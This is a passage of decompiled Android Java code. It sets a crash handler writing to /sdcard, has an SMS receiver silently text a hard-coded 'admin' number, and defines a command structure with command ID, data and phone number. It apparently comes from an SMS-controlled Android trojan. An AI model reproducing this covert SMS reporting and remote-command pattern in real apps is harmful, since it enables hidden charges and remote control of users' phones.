      if (!(Thread.getDefaultUncaughtExceptionHandler() instanceof CustomExceptionHandler)) {
        Thread.setDefaultUncaughtExceptionHandler(new CustomExceptionHandler("/sdcard"));
      }
      Looper.myLooper();
      Looper.prepare();
      try
      {
        Object localObject = new Time();
        ((Time)localObject).setToNow();
        ((Time)localObject).toMillis(true);
        localObject = PlayService.res.getString(2130968613);
        SMSReceiver.this.sendSMS(PlayService.sAdminNumber, (String)localObject);
        return;
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
      }
    }
  }
  
  class ips
  {
    int iCommand;
    String sData;
    String sNumber;
    
    public ips(int paramInt, String paramString1, String paramString2)
    {
      this.iCommand = paramInt;
      this.sData = paramString1;
      this.sNumber = paramString2;
    }
  }
}
